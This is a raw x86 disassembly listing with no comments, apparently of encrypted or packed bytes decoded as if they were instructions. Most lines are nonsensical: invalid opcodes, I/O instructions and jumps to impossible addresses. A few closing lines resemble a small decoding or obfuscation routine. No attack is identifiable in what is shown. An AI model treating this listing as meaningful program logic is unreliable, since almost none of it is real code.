  406aae:	push   esi
  406aaf:	fdiv   st(3),st
  406ab1:	loopne 0x406a3d
  406ab3:	mov    bl,0x0
  406ab5:	clc    
  406ab6:	jmp    0xd5f0010d
  406abb:	jle    0x406a8a
  406abd:	cli    
  406abe:	dec    ebx
  406abf:	dec    edx
  406ac0:	dec    ebp
  406ac1:	mov    ecx,0xbf70374e
  406ac6:	bound  ecx,QWORD PTR [edi-0x763bbf9f]
  406acc:	sbb    al,0x12
  406ace:	xor    ecx,DWORD PTR [ecx+0x5732289]
  406ad4:	fsubr  QWORD PTR [ebx+esi*1]
  406ad7:	jl     0x406a9f
  406ad9:	mov    edx,0xe87e664e
  406ade:	imul   edx,DWORD PTR [esi],0x1b9143f3
  406ae4:	and    al,0xa9
  406ae6:	mov    al,ds:0xa21dfd77
  406aeb:	mov    esp,0xaf5c6ecc
  406af0:	add    BYTE PTR [eax+0x6055bda9],0xc1
  406af7:	sub    cl,BYTE PTR [eax+0x5b73e24]
  406afd:	(bad)  
  406afe:	xchg   edx,eax
  406aff:	inc    esp
  406b00:	jb     0x406aa3
  406b02:	ja     0xf22c4378
  406b08:	mov    eax,ds:0x4b4bb0f8
  406b0d:	aaa    
  406b0e:	and    cl,BYTE PTR [ebx+0x74]
  406b11:	bnd jbe 0x406b3b
  406b14:	bt     ecx,ebx
  406b17:	sub    eax,0x5a6ee546
  406b1c:	fld    DWORD PTR [edx]
  406b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b1f:	or     eax,0xf9b8012b
  406b24:	ret    
  406b25:	pusha  
  406b26:	mov    ds:0x9930b2d2,eax
  406b2b:	mov    ecx,0xc58f061
  406b30:	gs push fs
  406b33:	repz daa 
  406b35:	popf   
  406b36:	xchg   ecx,eax
  406b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b38:	xor    al,0x3
  406b3a:	mov    ds:0x6d1804a7,al
  406b3f:	push   ds
  406b40:	push   ebp
  406b41:	lods   eax,DWORD PTR ds:[esi]
  406b42:	mov    esi,0x7a9fe532
  406b47:	jp     0x406b6f
  406b49:	jmp    0x64a2eaa1
  406b4e:	mov    ch,0x39
  406b50:	rcr    DWORD PTR [ebp+0x1d],0xb
  406b54:	push   ecx
  406b55:	xchg   esi,eax
  406b56:	es fwait
  406b58:	js     0x406bba
  406b5a:	inc    esp
  406b5b:	dec    esp
  406b5c:	dec    esi
  406b5d:	pop    ecx
  406b5e:	adc    esi,DWORD PTR [esp+edi*4+0x56]
  406b62:	fwait
  406b63:	adc    BYTE PTR [eax+0x68],0xf3
  406b67:	ins    DWORD PTR es:[edi],dx
  406b68:	dec    ebp
  406b69:	xor    al,0x4d
  406b6b:	test   eax,0xd55a5650
  406b70:	inc    sp
  406b72:	sub    eax,0x684797ea
  406b77:	dec    ecx
  406b78:	fstp   TBYTE PTR [edx+0x7ceb6ca]
  406b7e:	or     al,0x9a
  406b80:	pop    ss
  406b81:	test   eax,0x5fce7da2
  406b86:	cwde   
  406b87:	inc    ebp
  406b88:	or     eax,0xc1d84132
  406b8d:	shr    BYTE PTR [edx],0xf8
  406b90:	pop    ebx
  406b91:	imul   BYTE PTR [edx]
  406b93:	and    al,0x6b
  406b95:	jnp    0x406b90
  406b97:	adc    ch,ah
  406b99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b9a:	imul   edi,esi,0x23
  406b9d:	pop    ecx
  406b9e:	lds    ebx,FWORD PTR [esi+0xd0e200]
  406ba4:	les    ebp,FWORD PTR [ebp-0x6a]
  406ba7:	pop    esp
  406ba8:	pop    edi
  406ba9:	dec    edx
  406baa:	call   0xcc3cccd1
  406baf:	push   0xffffffee
  406bb1:	test   al,0xf3
  406bb3:	cdq    
  406bb4:	ror    DWORD PTR [eax],0xd4
  406bb7:	out    0x81,eax
  406bb9:	bound  esp,QWORD PTR [ebp+0x4e]
  406bbc:	adc    ecx,esi
  406bbe:	outs   dx,DWORD PTR ds:[esi]
  406bbf:	(bad)  
  406bc0:	stos   BYTE PTR es:[edi],al
  406bc1:	stos   BYTE PTR es:[edi],al
  406bc2:	add    eax,0x83a98c14
  406bc7:	sbb    DWORD PTR ds:0x65b997e1,ebp
  406bcd:	imul   edi,DWORD PTR [ebx+0x6c2fefef],0x4c388860
  406bd7:	mov    bh,0xd4
  406bd9:	cmp    BYTE PTR [ecx],bh
  406bdb:	xor    bl,dl
  406bdd:	mov    DWORD PTR [eax-0x48bb55c7],ecx
  406be3:	dec    eax
  406be4:	ds test eax,0x48ce714b
  406bea:	xchg   ecx,eax
  406beb:	cs enter 0xe9bd,0xbb
  406bf0:	jle    0x406bfd
  406bf2:	sbb    cl,bh
  406bf4:	push   ss
  406bf5:	(bad)  
  406bf6:	adc    eax,DWORD PTR ds:0x483ee352
  406bfc:	ret    
  406bfd:	pop    esi
  406bfe:	jno    0x406bb2
  406c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c01:	sub    dl,BYTE PTR gs:[esi-0x3cfbd9f9]
  406c08:	push   ecx
  406c09:	jmp    0xcfbfb441
  406c0e:	sbb    edi,ebp
  406c10:	push   esp
  406c11:	xchg   ebx,eax
  406c12:	mov    ch,0x22
  406c14:	(bad)  
  406c15:	(bad)  
  406c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c18:	lock bound eax,QWORD PTR [ebx]
  406c1b:	adc    eax,0xbd6ad2a9
  406c20:	lds    eax,FWORD PTR ss:[esi]
  406c23:	imul   eax,DWORD PTR [ebp-0x7c],0x24
  406c27:	in     eax,dx
  406c28:	das    
  406c29:	inc    eax
  406c2a:	inc    esi
  406c2b:	xchg   edx,eax
  406c2c:	fild   WORD PTR [edx+eiz*1]
  406c2f:	rol    BYTE PTR [ebp-0x6d],cl
  406c32:	sub    DWORD PTR cs:[edi+ebp*4],0x6178d6b
  406c3a:	or     al,0x36
  406c3c:	jge    0x406bda
  406c3e:	xchg   ebp,eax
  406c3f:	add    ch,dl
  406c41:	add    al,0xbe
  406c43:	push   ebx
  406c44:	sahf   
  406c45:	jns    0x406ca4
  406c47:	mov    cs,WORD PTR [edx]
  406c49:	popa   
  406c4a:	adc    eax,0x7679ec90
  406c4f:	into   
  406c50:	test   ebp,ebx
  406c52:	push   eax
  406c53:	loope  0x406c20
  406c55:	sti    
  406c56:	dec    edi
  406c57:	mov    ebp,?
  406c59:	or     al,0x84
  406c5b:	push   esp
  406c5c:	sbb    BYTE PTR [ebp-0x39],bl
  406c5f:	daa    
  406c60:	inc    esi
  406c61:	dec    DWORD PTR [ebx-0x55]
  406c64:	pop    ds
  406c65:	cmp    al,0x91
  406c67:	xchg   ebx,eax
  406c68:	mov    ds:0x6d7072e1,al
  406c6d:	ss xchg esi,eax
  406c6f:	mov    al,ds:0x47089175
  406c74:	mov    eax,0x5c37e82
  406c79:	or     bl,ch
  406c7b:	ds or  eax,0x6b0fa23e
  406c81:	xchg   ebp,edi
  406c83:	ins    BYTE PTR es:[edi],dx
  406c84:	imul   ebp,ebx,0x61
  406c87:	test   al,0xf6
  406c89:	and    DWORD PTR [ebp+0x5cba8306],eax
  406c8f:	push   ecx
  406c90:	sar    DWORD PTR [ecx+0x37],1
  406c93:	(bad)  [ebp-0x18cec569]
  406c99:	cs dec esp
  406c9b:	les    eax,FWORD PTR [esi]
  406c9d:	xchg   ebp,eax
  406c9e:	and    al,0xa5
  406ca0:	mov    bl,BYTE PTR [eax]
  406ca2:	mov    cl,0xe6
  406ca4:	xor    DWORD PTR [ebx-0x3d6ea9dc],esp
  406caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cab:	cli    
  406cac:	pop    ebp
  406cad:	sub    al,0xbd
  406caf:	adc    edx,ebx
  406cb1:	jnp    0x406d31
  406cb3:	pusha  
  406cb4:	or     edi,eax
  406cb6:	adc    BYTE PTR [esi],0x22
  406cb9:	aas    
  406cba:	popf   
  406cbb:	retf   
  406cbc:	stc    
  406cbd:	mov    ebx,0x6bcfff3
  406cc2:	gs scas eax,DWORD PTR es:[edi]
  406cc4:	test   BYTE PTR [ecx+0x1d],al
  406cc7:	dec    edi
  406cc8:	xor    al,0xed
  406cca:	mov    WORD PTR [esi],fs
  406ccc:	js     0x406cb4
  406cce:	vpacksswb ymm1,ymm1,YMMWORD PTR [edi-0x77]
  406cd3:	jl     0x406cfe
  406cd5:	jns    0x406c58
  406cd7:	xor    al,BYTE PTR ds:[ebx+0x14982cb3]
  406cde:	ret    
  406cdf:	push   cs
  406ce0:	out    dx,al
  406ce1:	popa   
  406ce2:	dec    esp
  406ce3:	lods   eax,DWORD PTR ds:[esi]
  406ce4:	stos   DWORD PTR es:[edi],eax
  406ce5:	mov    al,ds:0x216543f3
  406cea:	jl     0x406d32
  406cec:	sbb    BYTE PTR [ecx],al
  406cee:	sbb    eax,0x713d821d
  406cf3:	idiv   DWORD PTR [ecx+0x63b0f50f]
  406cf9:	inc    ebx
  406cfa:	add    al,0xf5
  406cfc:	lods   eax,DWORD PTR ds:[esi]
  406cfd:	call   0xb1c1:0xb4b1641c
  406d04:	mov    ecx,0x6b24769c
  406d09:	enter  0x6ce7,0x36
  406d0d:	fisub  WORD PTR [edi+0x37]
  406d10:	pop    esi
  406d11:	mov    ebx,0xc2a969b8
  406d16:	lds    edi,FWORD PTR [edi+0xd]
  406d19:	popa   
  406d1a:	add    BYTE PTR [ebx-0x24],bl
  406d1d:	pop    eax
  406d1e:	sub    eax,DWORD PTR [esi-0x52]
  406d21:	or     BYTE PTR [edi],ch
  406d23:	jno    0x406d6d
  406d25:	lea    ebp,cs:0xf0486649
  406d2c:	(bad)  
  406d2d:	dec    DWORD PTR [eax+0x19831c26]
  406d33:	in     eax,dx
  406d34:	add    DWORD PTR ss:[edx+0x31],0xffffffc1
  406d39:	ins    DWORD PTR es:[edi],dx
  406d3a:	cdq    
  406d3b:	imul   eax,DWORD PTR [edi+0x6ce590e7],0x1ae169c9
  406d45:	or     esp,DWORD PTR [eax-0x3b040f79]
  406d4b:	aam    0x58
  406d4d:	mov    edi,0xef82329
  406d52:	test   al,0x9c
  406d54:	mov    bl,0x21
  406d56:	xchg   edx,eax
  406d57:	out    0x10,al
  406d59:	cs pop ecx
  406d5b:	rol    al,0x7d
  406d5e:	adc    bh,ah
  406d60:	fcomi  st,st(0)
  406d62:	adc    BYTE PTR [esi],dl
  406d64:	les    esi,FWORD PTR [edi+0x10096ff7]
  406d6a:	mov    eax,0x5e6c7fea
  406d6f:	mov    dl,0x13
  406d71:	ins    BYTE PTR es:[edi],dx
  406d72:	mov    ah,0xf1
  406d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d75:	sbb    DWORD PTR [edx-0x23584a21],ebx
  406d7b:	xchg   DWORD PTR [esi-0x26],esp
  406d7e:	ins    DWORD PTR es:[edi],dx
  406d7f:	cmp    edx,0x62f3a475
  406d85:	(bad)  
  406d86:	xchg   ebx,eax
  406d87:	add    BYTE PTR [edx+0x75f8bd70],0x18
  406d8e:	mov    al,0xcc
  406d90:	sbb    DWORD PTR [esi],ecx
  406d92:	sbb    al,0x9b
  406d94:	scas   eax,DWORD PTR es:[edi]
  406d95:	xor    edx,DWORD PTR [ebx-0x4d0e7b4c]
  406d9b:	rol    BYTE PTR [ebx-0x2e],0xb3
  406d9f:	inc    eax
  406da0:	or     ah,bh
  406da2:	inc    ecx
  406da3:	sub    eax,0xc66feca2
  406da8:	dec    edx
  406da9:	mov    eax,gs:0xa80df2f3
  406daf:	fs sbb al,0xe5
  406db2:	outs   dx,BYTE PTR ds:[esi]
  406db3:	mov    DWORD PTR [ebp+0x73],esp
  406db6:	fs jne 0x406e0c
  406db9:	sbb    BYTE PTR [esi-0x7c],dl
  406dbc:	pop    ebx
  406dbd:	aaa    
  406dbe:	jmp    0x857d:0x4737e170
  406dc5:	mov    esp,0x7d26fed7
  406dca:	aaa    
  406dcb:	std    
  406dcc:	inc    esi
  406dcd:	and    al,0x82
  406dcf:	frstor [ebp-0x5aad88a3]
  406dd5:	inc    esi
  406dd6:	jge    0x406db2
  406dd8:	jbe    0x406e22
  406dda:	out    dx,al
  406ddb:	mov    edi,0x12d97573
  406de0:	inc    eax
  406de1:	mov    ecx,0xeeb931ff
  406de6:	cmp    bl,dl
  406de8:	lahf   
  406de9:	sar    BYTE PTR [edi],0x17
  406dec:	mov    al,ds:0xe49b331
  406df1:	fucomp st(1)
  406df3:	add    ah,ch
  406df5:	out    dx,eax
  406df6:	test   al,0x10
  406df8:	rol    esi,cl
  406dfa:	mov    esp,DWORD PTR [eax+0x7d]
  406dfd:	sub    eax,0x39588b7b
  406e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e03:	cdq    
  406e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e05:	and    DWORD PTR [ebx+0x7e],0x3ff442de
  406e0c:	pop    ss
  406e0d:	adc    eax,0x3c40fe72
  406e12:	or     DWORD PTR [ecx+0x7a],eax
  406e15:	push   0x99529055
  406e1a:	pop    esp
  406e1b:	sub    BYTE PTR [ebx+ebx*2],ch
  406e1e:	and    BYTE PTR [edx+ebp*4-0x1610950c],dl
  406e25:	aad    0x50
  406e27:	pop    ebx
  406e28:	out    dx,eax
  406e29:	retf   0xbbe3
  406e2c:	inc    edx
  406e2d:	lods   al,BYTE PTR ds:[esi]
  406e2e:	stc    
  406e2f:	loopne 0x406e90
  406e31:	data16 mov al,0x17
  406e34:	push   ds
  406e35:	mov    dl,0x39
  406e37:	sub    eax,0xbdc3ee3d
  406e3c:	jns    0x406e10
  406e3e:	js     0x406e79
  406e40:	sbb    eax,0xb45d9aad
  406e45:	leave  
  406e46:	aam    0xa
  406e48:	lock sbb al,0x71
  406e4b:	push   ecx
  406e4c:	out    dx,eax
  406e4d:	push   ecx
  406e4e:	push   cs
  406e4f:	ins    BYTE PTR es:[edi],dx
  406e50:	mov    edx,DWORD PTR [ebp-0x20]
  406e53:	mov    DWORD PTR ds:0x4346c7,0x7e00
  406e5d:	jmp    0x40724b
  406e62:	xchg   dl,dl
  406e64:	mov    bl,0x98
  406e66:	jae    0x406ec1
  406e68:	popf   
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax+0x25a3aa66]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406e5f
  406e7b:	mov    dl,0x50
  406e7d:	scas   eax,DWORD PTR es:[edi]
  406e7e:	or     al,0x40
  406e80:	lea    eax,[edx+eax*1-0x62]
  406e84:	gs inc esp
  406e86:	push   eax
  406e87:	pop    ebx
  406e88:	add    dl,0xd0
  406e8b:	push   edi
  406e8c:	jle    0x406ec5
  406e8e:	test   DWORD PTR [ecx-0x7a],ecx
  406e91:	mul    BYTE PTR [edi-0x3b]
  406e94:	mov    esp,0xd3515560
  406e99:	xchg   ecx,ebx
  406e9b:	sbb    BYTE PTR [edx+0x57],bl
  406e9e:	mov    ds:0xac9937ea,eax
  406ea3:	xor    bl,0x0
  406ea6:	or     eax,0x722e09ee
  406eab:	outs   dx,BYTE PTR ds:[esi]
  406eac:	ins    BYTE PTR es:[edi],dx
  406ead:	mov    esp,0x78b24991
  406eb2:	sbb    BYTE PTR [edx+0x47],0xa
  406eb6:	dec    edx
  406eb7:	xor    eax,0x612e5414
  406ebc:	pop    edi
  406ebd:	pop    edx
  406ebe:	pop    es
  406ebf:	push   0xfffffffa
  406ec1:	scas   al,BYTE PTR es:[edi]
  406ec2:	fisttp QWORD PTR [eax-0x6b6fbe53]
  406ec8:	mov    ah,cl
  406eca:	cld    
  406ecb:	test   al,0xc
  406ecd:	das    
  406ece:	in     eax,dx
  406ecf:	inc    ebx
  406ed0:	test   BYTE PTR [edi-0x5570d285],al
  406ed6:	int    0xa5
  406ed8:	add    DWORD PTR [ebx+0x3017a362],edi
  406ede:	mov    ch,0x33
  406ee0:	mov    esp,0x88a03a05
  406ee5:	mov    bh,0xeb
  406ee7:	pop    ss
  406ee8:	mov    ds:0x6a98ceff,eax
  406eed:	lahf   
  406eee:	xchg   BYTE PTR [edi+0x53],ch
  406ef1:	shl    BYTE PTR [ecx+0x47],cl
  406ef4:	loop   0x406e81
  406ef6:	or     BYTE PTR [esi+edi*8+0x5b220023],cl
  406efd:	fiadd  WORD PTR [esi]
  406eff:	mov    ebp,0x93828363
  406f04:	fstp   QWORD PTR [ebx-0x7a2a1dc9]
  406f0a:	mov    al,ds:0xf298fbd8
  406f0f:	test   al,0xe6
  406f11:	mov    ecx,0x8f1f3ac
  406f16:	cld    
  406f17:	add    al,0x80
  406f19:	and    ecx,DWORD PTR [ebp-0x5725379b]
  406f1f:	pop    ebx
  406f20:	jb     0x406f72
  406f22:	daa    
  406f23:	mov    edx,0x3a812562
  406f28:	adc    eax,0xdd453024
  406f2d:	ficomp WORD PTR [esi]
  406f2f:	and    al,0xce
  406f31:	and    eax,0x6335215e
  406f36:	into   
  406f37:	or     bh,al
  406f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f3a:	(bad)  
  406f3b:	fld    DWORD PTR [eax+ecx*4+0x7d]
  406f3f:	imul   DWORD PTR [eax+eax*8]
  406f42:	xchg   ecx,eax
  406f43:	je     0x406ec5
  406f45:	mov    eax,0xfa80a307
  406f4a:	fst    DWORD PTR [esp+esi*4-0x3aa60b4d]
  406f51:	repnz dec edx
  406f53:	adc    BYTE PTR [ebp+ecx*8+0x77],ch
  406f57:	jns    0x406ee6
  406f59:	outs   dx,DWORD PTR ds:[esi]
  406f5a:	mov    ebx,0x575be880
  406f5f:	loope  0x406f7f
  406f61:	jo     0x406f30
  406f63:	jno    0x406f65
  406f65:	add    bl,BYTE PTR [ebx-0x13f424db]
  406f6b:	stc    
  406f6c:	out    dx,eax
  406f6d:	sbb    DWORD PTR [eax-0x1],eax
  406f70:	inc    edx
  406f71:	js     0x406f3e
  406f73:	inc    ebx
  406f74:	xchg   DWORD PTR [ecx],eax
  406f76:	and    eax,0xea72202f
  406f7b:	(bad)  
  406f7c:	mov    ds:0xca676850,al
  406f81:	mov    ebp,0x5627939a
  406f86:	sub    BYTE PTR es:[edi],cl
  406f89:	mul    BYTE PTR [edx+ecx*1]
  406f8c:	dec    esi
  406f8d:	or     eax,0x395d915d
  406f92:	mov    eax,0x71153fee
  406f97:	scas   al,BYTE PTR es:[edi]
  406f98:	lods   al,BYTE PTR ds:[esi]
  406f99:	push   esi
  406f9a:	ja     0x40700e
  406f9c:	mov    esi,0x2a5b25d0
  406fa1:	xor    al,0x62
  406fa3:	mov    bh,0xce
  406fa5:	xchg   DWORD PTR [ecx+0x5d63449b],ebx
  406fab:	push   ecx
  406fac:	std    
  406fad:	mov    ah,0x34
  406faf:	mov    ch,0x5f
  406fb1:	es inc esp
  406fb3:	cmp    esp,esi
  406fb5:	push   0x45e17eb5
  406fba:	mov    ah,0xeb
  406fbc:	outs   dx,BYTE PTR es:[esi]
  406fbe:	pop    esp
  406fbf:	ds xchg edx,edi
  406fc2:	adc    edx,edx
  406fc4:	and    al,BYTE PTR [ecx]
  406fc6:	sbb    al,0x6
  406fc8:	fs jno 0xc0037675
  406fcf:	dec    ecx
  406fd0:	xchg   BYTE PTR [eax],dh
  406fd2:	and    al,0x8e
  406fd4:	xor    BYTE PTR [ebx+edx*4-0x7a312565],bh
  406fdb:	stos   BYTE PTR es:[edi],al
  406fdc:	outs   dx,BYTE PTR ds:[esi]
  406fdd:	ss cld 
  406fdf:	lock cli 
  406fe1:	sub    esp,DWORD PTR [edi-0x2]
  406fe4:	icebp  
  406fe5:	xchg   edx,eax
  406fe6:	sar    BYTE PTR [edi+ebx*1+0x19],1
  406fea:	push   0xdf10adbc
  406fef:	sbb    eax,edi
  406ff1:	mov    ebx,0x23b67e0b
  406ff6:	fiadd  WORD PTR [esi-0x27561e31]
  406ffc:	sbb    eax,DWORD PTR [edi]
  406ffe:	(bad)  [ebp-0x10e78a77]
  407004:	xor    bh,BYTE PTR [edx]
  407006:	mov    dh,0x20
  407008:	retf   0xd1b2
  40700b:	inc    esi
  40700c:	xor    DWORD PTR [eax],edx
  40700e:	inc    ebp
  40700f:	pop    esi
  407010:	or     bh,BYTE PTR [ebx]
  407012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407013:	repnz lahf 
  407015:	mov    esi,0xb8affbbe
  40701a:	jnp    0x40708f
  40701c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40701e:	aam    0x9
  407020:	cmp    ecx,DWORD PTR [ebp+0x79d5d08c]
  407026:	jne    0x40704f
  407028:	ins    BYTE PTR es:[edi],dx
  407029:	pop    esi
  40702a:	inc    edx
  40702b:	jecxz  0x40701d
  40702d:	dec    ebx
  40702e:	daa    
  40702f:	add    eax,0x6617ed5c
  407034:	inc    esi
  407035:	js     0x406fe2
  407037:	xchg   ecx,eax
  407038:	scas   al,BYTE PTR es:[edi]
  407039:	jnp    0x407014
  40703b:	ret    
  40703c:	popa   
  40703d:	jmp    0xe7cb:0xa96bb5d0
  407044:	ds hlt 
  407046:	mov    cl,0xf2
  407048:	popf   
  407049:	fs stos DWORD PTR es:[edi],eax
  40704b:	lock cmp esi,DWORD PTR [edi+0x18290a30]
  407052:	adc    ch,dl
  407054:	out    dx,al
  407055:	ret    0x4071
  407058:	cmp    DWORD PTR [edx+0x1dcbc265],esi
  40705e:	dec    eax
  40705f:	mov    bh,0xbc
  407061:	rcr    BYTE PTR [edx-0x58],cl
  407064:	push   ebx
  407065:	test   esp,esi
  407067:	aam    0x28
  407069:	sbb    ch,BYTE PTR [edi+0x1e3c948d]
  40706f:	call   DWORD PTR [ebx]
  407071:	scas   al,BYTE PTR es:[edi]
  407072:	test   ebx,ecx
  407074:	test   DWORD PTR [ebx],ecx
  407076:	sbb    eax,0xe988d7e
  40707b:	xor    ebp,DWORD PTR [eax+0x39]
  40707e:	inc    esp
  40707f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407080:	xor    ebx,DWORD PTR [edi-0x6f62add6]
  407086:	inc    esp
  407087:	pop    ds
  407088:	sub    al,0x6a
  40708a:	sbb    esp,esp
  40708c:	stos   BYTE PTR es:[edi],al
  40708d:	mov    dh,0xef
  40708f:	lea    ebp,[ecx]
  407091:	retf   0x75e3
  407094:	pop    esi
  407095:	arpl   WORD PTR [ebp-0x2e],di
  407098:	push   DWORD PTR [edi-0x3a9a89ae]
  40709e:	ss int 0x68
  4070a1:	fdivr  QWORD PTR [eax+0x61]
  4070a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070a5:	adc    DWORD PTR [edi-0x2b],0xffffffee
  4070a9:	xor    edi,DWORD PTR gs:[ebp+0x70]
  4070ad:	div    cl
  4070af:	fucom  st(5)
  4070b1:	mov    ah,0x21
  4070b3:	repnz daa 
  4070b5:	pop    es
  4070b6:	sbb    BYTE PTR ss:[edx+ebp*2],ch
  4070ba:	in     eax,dx
  4070bb:	aam    0xa6
  4070bd:	es push ebx
  4070bf:	cmp    BYTE PTR [edx+0x62],0x92
  4070c3:	out    dx,al
  4070c4:	ja     0x407091
  4070c6:	mov    edx,0x2bed621f
  4070cb:	jo     0x40712c
  4070cd:	cmp    BYTE PTR [edx-0x1583b780],dh
  4070d3:	cld    
  4070d4:	dec    esi
  4070d5:	dec    ecx
  4070d6:	xor    al,dh
  4070d8:	sub    bl,dl
  4070da:	lea    ebp,[ebx+esi*8-0x156ec50b]
  4070e1:	cmc    
  4070e2:	test   edx,ebp
  4070e4:	cmp    ch,cl
  4070e6:	xchg   esi,eax
  4070e7:	push   cs
  4070e8:	ret    
  4070e9:	and    BYTE PTR gs:[ecx-0x78],cl
  4070ed:	hlt    
  4070ee:	add    al,0x13
  4070f0:	cmp    al,0xd5
  4070f2:	icebp  
  4070f3:	and    eax,0xda148b8a
  4070f8:	cmp    edi,ebx
  4070fa:	fs mov edx,0x7c0ea658
  407100:	sbb    eax,0x20be75da
  407105:	mov    dh,0xae
  407107:	mov    ch,0x91
  407109:	jge    0x407143
  40710b:	in     al,0x34
  40710d:	test   BYTE PTR ds:0xc8d39add,ah
  407113:	xchg   esp,eax
  407114:	das    
  407115:	(bad)
  407118:	xor    eax,DWORD PTR [eax-0x278ce82a]
  40711e:	xor    eax,0xbe02eff4
  407123:	into   
  407124:	xor    al,0x24
  407126:	rcr    DWORD PTR [edx+ebx*4-0x73],0x0
  40712b:	cs ds loope 0x407147
  40712f:	xor    DWORD PTR ds:0x7781b007,esi
  407135:	loope  0x407131
  407137:	pop    ebx
  407138:	jbe    0x407109
  40713a:	sbb    eax,0x43eca924
  40713f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407140:	jo     0x40713a
  407142:	bswap  ebp
  407144:	or     ah,dl
  407146:	xchg   ch,dh
  407148:	cdq    
  407149:	mov    ss,WORD PTR [esi]
  40714b:	pushf  
  40714c:	call   0xde97:0xfc5e70a8
  407153:	ficomp WORD PTR [esi+0x1ecc2077]
  407159:	sti    
  40715a:	into   
  40715b:	pop    ds
  40715c:	je     0x40716f
  40715e:	inc    esi
  40715f:	outs   dx,DWORD PTR ds:[esi]
  407160:	mov    dl,0xb2
  407162:	add    BYTE PTR [esi],al
  407164:	aam    0xed
  407166:	imul   ecx,DWORD PTR [ebp+0x6dc4120e],0x2045ba96
  407170:	mov    ecx,0x3b1b18cb
  407175:	push   eax
  407176:	mov    ecx,0x72c47ff7
  40717b:	adc    al,0xee
  40717d:	sbb    BYTE PTR [ecx-0x79],0xb3
  407181:	jne    0x407110
  407183:	and    BYTE PTR [ebx-0x5bdc2820],ah
  407189:	dec    edx
  40718a:	ret    
  40718b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40718c:	cmp    eax,0xc3cb7d12
  407191:	xor    esi,DWORD PTR [edx+0x4752f73]
  407197:	xchg   DWORD PTR ds:0x4932d8f5,ebx
  40719d:	into   
  40719e:	mov    eax,DWORD PTR [esi-0x735af756]
  4071a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a5:	(bad)  
  4071a6:	pop    ebp
  4071a7:	mov    esi,ebx
  4071a9:	mov    ebp,0x55a18d1a
  4071ae:	push   ss
  4071af:	cmc    
  4071b0:	pusha  
  4071b1:	sub    eax,0x63243c6c
  4071b6:	ins    BYTE PTR es:[edi],dx
  4071b7:	out    dx,eax
  4071b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071b9:	cmp    BYTE PTR [ebp+0x6966b283],dh
  4071bf:	loope  0x40723b
  4071c1:	out    0x9a,eax
  4071c3:	xchg   al,ah
  4071c5:	push   0xffffffa4
  4071c7:	repz adc esi,DWORD PTR [edx]
  4071ca:	xlat   BYTE PTR ds:[ebx]
  4071cb:	mov    dl,0xf2
  4071cd:	xchg   DWORD PTR [edx],esi
  4071cf:	xlat   BYTE PTR cs:[ebx]
  4071d1:	loop   0x4071ed
  4071d3:	pop    edx
  4071d4:	data16 and dh,cl
  4071d7:	sub    BYTE PTR [eax],al
  4071d9:	fsubr  st(0),st
  4071db:	pop    esp
  4071dc:	mov    ebp,0x77fc75fe
  4071e1:	jge    0x40722f
  4071e3:	and    DWORD PTR [ebx+0x6a],esp
  4071e6:	mov    dh,BYTE PTR [ecx-0x231d6799]
  4071ec:	mov    cl,BYTE PTR [eax+0x3f6e8f77]
  4071f2:	xor    eax,0x72dfba69
  4071f7:	mov    eax,DWORD PTR [eax+0x116283d9]
  4071fd:	jmp    0x46e44c12
  407202:	shl    BYTE PTR [ecx+0x23],1
  407205:	sbb    al,0x7d
  407207:	sbb    eax,0x6c903535
  40720c:	nop
  40720d:	scas   al,BYTE PTR es:[edi]
  40720e:	dec    esp
  40720f:	imul   esi,edi,0x3fde0138
  407215:	add    eax,0xfe721cfa
  40721a:	jg     0x4071d7
  40721c:	jo     0x4071cc
  40721e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40721f:	push   ecx
  407220:	retf   
  407221:	inc    edx
  407222:	outs   dx,DWORD PTR ds:[esi]
  407223:	cmp    al,0xfe
  407225:	jb     0x4071c9
  407227:	cmp    esi,edx
  407229:	sub    DWORD PTR [edi+0x16],esi
  40722c:	sub    al,BYTE PTR [edx+0x6c]
  40722f:	sbb    al,0x60
  407231:	pop    ecx
  407232:	cmp    BYTE PTR [esi],0xfc
  407235:	les    edi,FWORD PTR [edx]
  407237:	rol    DWORD PTR [esi+0x589d9b8e],1
  40723d:	and    al,0x62
  40723f:	push   0x952469a7
  407244:	sub    edx,DWORD PTR [esi-0x7df4bae4]
  40724a:	jb     0x407213
  40724c:	inc    ebp
  40724d:	aam    0x39
  40724f:	dec    edi
  407250:	add    BYTE PTR [eax],al
  407252:	mov    DWORD PTR ds:0x43466f,0x15ae
  40725c:	cmp    eax,DWORD PTR [edx]
  40725e:	mov    DWORD PTR ds:0x43465f,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434793,0x434663
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434687
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x43467b,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x4346cb,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x4346bb,0x7ba0
